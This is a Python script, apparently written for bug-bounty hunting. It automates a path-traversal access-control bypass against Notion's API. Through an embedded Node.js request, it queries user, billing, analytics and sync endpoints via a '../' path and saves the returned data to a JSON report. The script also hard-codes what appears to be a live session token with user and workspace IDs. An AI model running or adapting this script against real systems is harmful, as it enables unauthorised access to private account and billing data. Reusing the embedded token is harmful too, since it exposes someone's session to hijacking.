import requests
import json
import os
import time
import subprocess
import uuid

# ==============================================================================
# AGL RESONANCE EXTRACTOR - v1.0
# Description: Automated Path Traversal & Sensitive Data Exfiltration Tool
# Target System: Notion (Access Control Bypass)
# ==============================================================================

# --- 1. User Configuration ---
CONFIG = {
    "TOKEN": "v03:eyJhbGciOiJkaXIiLCJraWQiOiJwcm9kdWN0aW9uOnRva2VuLXYzOjIwMjQtMTEtMDciLCJlbmMiOiJBMjU2Q0JDLUhTNTEyIn0..NDkf-2s3AC3RGsiDqltLdg.LZy9w28gHEunIdhu5z2i0wsLIiCIHRXGKAy1gxZQvHgHKojVRscJQyF9hi0Gwn3g_7yui0TIwDRzM7neDLStQdIwpyeFLGo-oorWPkFOK-PtUXGPpCrocEkP7pNmgvk4-KJyGgGtBmNEYSfJCh1q1pDx4fjONf2XKAH3_Z3CPXv8YcsqXGb5Of4LHRXhxUFRE586QwD79mh3YncVJkVHQIlang7vmWWWGOnOlYQfhArvPSH_WY4mXYe-bA_TDxAIHce4-hOF2wxc8V1aEo4Tll7DZCwcNY7RJBXTIV6hbHP7o06aqZQPrVu9pHSFmdcSh__FPkWgLNDSEGxM3YTTG2QsvUzhiCm2DoAhjNJZ6rA.xLI3PLlbyb_gZqKALWjylgMTcFFqOICP9CtujjDpkI0",
    "USER_ID": "2ded872b-594c-8140-bec9-0002b75e4d7b",
    "SPACE_ID": "95180885-dc59-8120-ae2e-0003ec6b4ca5",
    "BASE_URL": "https://www.notion.so",
    "BROWSER_ID": str(uuid.uuid4())
}

# --- 2. Resonance Frequencies (Target Endpoints) ---
RESONANCE_FREQUENCIES = [
    "loadUserContent",          # User data and email
    "getUserAnalytics",         # Usage analytics
    "getSpaces",                # Workspaces
    "getPublicSpaceData",       # Public data
    "getSubscriptionDetails",   # Subscription details
    "getBillingHistory",        # Billing history (Hard target)
    "syncRecordValues",         # Data sync (Very dangerous)
    "enqueueTask"               # Scheduled tasks
]

# --- 3. Amplification Path (The Payload) ---
AMPLIFICATION_PATH = "/front-api/notifications/en-US/../../api/v3/"

def run_node_request(endpoint):
    # Node.js script template
    node_script = f"""
    const https = require('https');

    const postData = JSON.stringify({{}});

    const options = {{
        hostname: 'www.notion.so',
        port: 443,
        path: '{AMPLIFICATION_PATH}{endpoint}',
        method: 'GET',
        headers: {{
            'Cookie': 'token_v2={CONFIG['TOKEN']}; notion_user_id={CONFIG['USER_ID']}; notion_browser_id={CONFIG['BROWSER_ID']}',
            'x-notion-active-user-header': '{CONFIG['USER_ID']}',
            'x-notion-space-id': '{CONFIG['SPACE_ID']}',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AGL/Hunter'
        }}
    }};

    const req = https.request(options, (res) => {{
        let data = '';
        
        res.on('data', (chunk) => {{
            data += chunk;
        }});
        
        res.on('end', () => {{
            const result = {{
                statusCode: res.statusCode,
                headers: res.headers,
                body: data
            }};
            console.log(JSON.stringify(result));
        }});
    }});

    req.on('error', (e) => {{
        console.error(e);
    }});

    req.end();
    """

    try:
        process = subprocess.Popen(
            ["node", "-e", node_script],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            encoding='utf-8'
        )
        stdout, stderr = process.communicate()
        
        if stderr:
            # print(f"Node stderr: {stderr}")
            pass
            
        if stdout.strip():
            return json.loads(stdout)
    except Exception as e:
        print(f"Node execution error: {e}")
    return None

def scan_and_extract():
    print(f"""
    =========================================
       AGL RESONANCE EXTRACTOR - STARTED
    =========================================
    [+] Target: {CONFIG['BASE_URL']}
    [+] Payload: {AMPLIFICATION_PATH}
    [+] Frequencies Loaded: {len(RESONANCE_FREQUENCIES)}
    """)

    evidence_bag = {}

    for endpoint in RESONANCE_FREQUENCIES:
        # Build attack URL
        target_url = f"{CONFIG['BASE_URL']}{AMPLIFICATION_PATH}{endpoint}"
        
        print(f"[*] Amplifying Resonance on: {endpoint} ...", end=" ")
        
        try:
            # Use Node.js wrapper instead of requests
            response_data = run_node_request(endpoint)
            
            if response_data:
                status_code = response_data.get('statusCode')
                body = response_data.get('body', '')
                headers = response_data.get('headers', {})
                content_type = headers.get('content-type', '')
                
                # Analyze response
                if status_code == 200:
                    if 'application/json' in content_type:
                        print("✅ [HIT!] VULNERABILITY CONFIRMED")
                        print(f"    -> Data Size: {len(body)} bytes")
                        
                        # Save data to bag
                        try:
                            data = json.loads(body)
                            evidence_bag[endpoint] = {
                                "status": "VULNERABLE",
                                "url": target_url,
                                "data": data
                            }
                        except:
                            evidence_bag[endpoint] = {"status": "RAW_DATA", "data": body[:500]}
                    else:
                        print(f"⚠️  [MISMATCH] 200 OK but type is {content_type} (Likely HTML Error)")
                
                elif status_code == 404:
                    print("❌ [MISS] Endpoint Name Incorrect")
                elif status_code == 403:
                    print("⛔ [BLOCKED] Access Denied")
                elif status_code == 405:
                    print("⛔ [BLOCKED] Method Not Allowed (405)")
                elif status_code == 302:
                    location = headers.get('location', 'Unknown')
                    print(f"↪️ [REDIRECT] To: {location}")
                else:
                    print(f"⚠️  [STATUS {status_code}] Unexpected")
            else:
                print("⚠️  [ERROR] No response from Node.js wrapper")

        except Exception as e:
            print(f"Error: {e}")
        
        # Simple wait to avoid blocking
        time.sleep(0.5)

    # --- 4. Generate Final Report ---
    if evidence_bag:
        filename = "AGL_Evidence_Report.json"
        with open(filename, "w", encoding="utf-8") as f:
            json.dump(evidence_bag, f, indent=4, ensure_ascii=False)
        
        print(f"\n[SUCCESS] 🚀 Analysis Complete.")
        print(f"[+] Evidence saved to: {os.path.abspath(filename)}")
        print("[+] Attach this file to your HackerOne report.")
    else:
        print("\n[FAILED] No vulnerabilities verified in this scan.")

if __name__ == "__main__":
    scan_and_extract()
